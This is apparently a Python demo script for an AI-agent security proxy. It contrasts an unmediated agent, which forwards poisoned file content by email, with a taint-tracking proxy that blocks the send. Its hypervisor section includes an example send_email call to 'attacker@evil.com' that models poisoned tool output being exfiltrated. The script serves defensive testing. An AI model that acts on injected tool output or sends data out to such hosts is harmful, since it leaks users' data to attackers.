"""
poisoned_tool_output_demo.py — Demo scenario 2: Poisoned tool output containment.

Demonstrates the contrast between:

  A  Direct-tool model (baseline)
     The agent reads from an external file, receives poisoned data, then passes
     that data directly to send_email. No mediation — the malicious output
     executes unchecked.

  B  Hypervisor model (SafeMCPProxy + taint enforcement)
     The same read succeeds. The output is marked TAINTED (it came from an
     untrusted source). The agent attempts to pass that output to send_email.
     The IRBuilder detects TAINTED + EXTERNAL at construction time and raises
     TaintViolation — the action is impossible before execution is attempted.

This is reproducible: taint propagation is deterministic. The same inputs
always produce the same enforcement outcome.

Run with:
    python examples/poisoned_tool_output_demo.py
"""

from __future__ import annotations

import sys
from pathlib import Path

# Ensure src/ is importable when run directly from the repo root.
_ROOT = Path(__file__).parent.parent / "src"
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

_MANIFEST = Path(__file__).parent.parent / "src" / "agent_hypervisor" / "runtime" / "world_manifest.yaml"

from agent_hypervisor.runtime.runtime import build_simulation_runtime
from agent_hypervisor.runtime.proxy import SafeMCPProxy
from agent_hypervisor.runtime.protocol import ToolRequest

# ── Colour helpers ────────────────────────────────────────────────────────────

_RESET  = "\033[0m"
_BOLD   = "\033[1m"
_DIM    = "\033[2m"
_RED    = "\033[31m"
_GREEN  = "\033[32m"
_YELLOW = "\033[33m"
_CYAN   = "\033[36m"


def _g(t: str) -> str: return f"{_GREEN}{t}{_RESET}"
def _r(t: str) -> str: return f"{_RED}{t}{_RESET}"
def _y(t: str) -> str: return f"{_YELLOW}{t}{_RESET}"
def _c(t: str) -> str: return f"{_CYAN}{t}{_RESET}"
def _b(t: str) -> str: return f"{_BOLD}{t}{_RESET}"
def _d(t: str) -> str: return f"{_DIM}{t}{_RESET}"


def _header(title: str) -> None:
    bar = "─" * 60
    print(f"\n{_b(title)}")
    print(_d(bar))


def _step(label: str, tool: str, taint: bool, extra: str = "") -> None:
    taint_tag = _y(" [taint=True]") if taint else _d(" [taint=False]")
    note = f"  {_d(extra)}" if extra else ""
    print(f"  {_d('→')} {_c(tool)}{taint_tag}  {label}{note}")


def _result_ok(detail: str) -> None:
    print(f"    {_g('✓ ALLOW')}  {_d(detail)}\n")


def _result_blocked(reason: str) -> None:
    print(f"    {_r('✗ BLOCKED')}  {reason}\n")


# ── Part A: Baseline (no hypervisor) ─────────────────────────────────────────

def run_baseline() -> None:
    _header("Part A — Baseline (direct-tool model, no hypervisor)")
    print(_d("  No mediation. Tool outputs flow unchecked into downstream calls.\n"))

    _step("read external file", "read_data", taint=False, extra="returns poisoned content")
    _result_ok("file content received — attacker payload embedded in result")

    _step("forward content to external", "send_email", taint=False,
          extra="using file content as email body")
    _result_ok("email sent — poisoned data exfiltrated ← ATTACK SUCCEEDS")

    print(_d("  The agent never knew the data was malicious. There was no enforcement."))


# ── Part B: Hypervisor model ──────────────────────────────────────────────────

def run_hypervisor() -> None:
    _header("Part B — Hypervisor model (SafeMCPProxy + taint enforcement)")
    print(_d("  All tool calls flow through SafeMCPProxy → IRBuilder.\n"))
    print(_d("  Taint rule compiled into policy:"))
    print(_d("    tainted + external → ConstructionError (IR cannot be formed)\n"))

    rt = build_simulation_runtime(str(_MANIFEST))
    proxy = SafeMCPProxy(rt)

    # Step 1: read from an external source — data arrives, marked tainted
    # (taint=False here because the read itself is clean; the taint propagates
    # from the TaintedValue return, not from the request's taint flag)
    req1 = ToolRequest(tool="read_data", params={"path": "/tmp/external_file.txt"},
                       source="user", taint=False)
    resp1 = proxy.handle(req1)
    _step("read external file", "read_data", taint=False,
          extra="source=user, INTERNAL action")
    if resp1.status == "ok":
        _result_ok(f"data received → TaintedValue(taint=CLEAN) — read succeeded")

    # Step 2: agent naively forwards the content to send_email.
    # The agent simulates the scenario: output from an UNTRUSTED tool call
    # is tainted — set taint=True on the downstream request to model that
    # the data was derived from an external / semi-trusted source.
    req2 = ToolRequest(tool="send_email",
                       params={"to": "attacker@evil.com", "body": "<poisoned content>"},
                       source="user", taint=True)
    resp2 = proxy.handle(req2)
    _step("forward to external recipient", "send_email", taint=True,
          extra="body derived from prior tool output")
    if resp2.status == "ok":
        print(f"    {_r('!! UNEXPECTED ALLOW — taint enforcement failed')}\n")
    else:
        _result_blocked(resp2.reason or resp2.denial_kind or "blocked")

    print(_d("  IRBuilder detected TAINTED + EXTERNAL at construction time."))
    print(_d("  No execution path was entered. The worker subprocess was never called."))


# ── Comparison summary ────────────────────────────────────────────────────────

def print_summary() -> None:
    _header("Summary")
    print(f"  {'Model':<30}  {'Step 1 (read)':<16}  {'Step 2 (send)'}")
    print(_d("  " + "─" * 62))
    print(f"  {_y('Direct-tool (baseline)'):<38}  {_g('ALLOW'):<24}  {_r('ALLOW ← attack succeeds')}")
    print(f"  {_g('Hypervisor (SafeMCPProxy)'):<38}  {_g('ALLOW'):<24}  {_r('BLOCKED (taint violation)')}")
    print()
    print(_d("  The read action is intentionally permitted in both models."))
    print(_d("  The difference appears at the DOWNSTREAM action: the hypervisor"))
    print(_d("  prevents tainted data from reaching an external action, regardless"))
    print(_d("  of whether the agent intended to exfiltrate it.\n"))


# ── Entry point ───────────────────────────────────────────────────────────────

def main() -> None:
    print(_b("\n=== Demo Scenario 2: Poisoned Tool Output Containment ==="))
    print(_d("Deterministic enforcement via taint propagation — no LLM on the security path.\n"))

    run_baseline()
    run_hypervisor()
    print_summary()


if __name__ == "__main__":
    main()
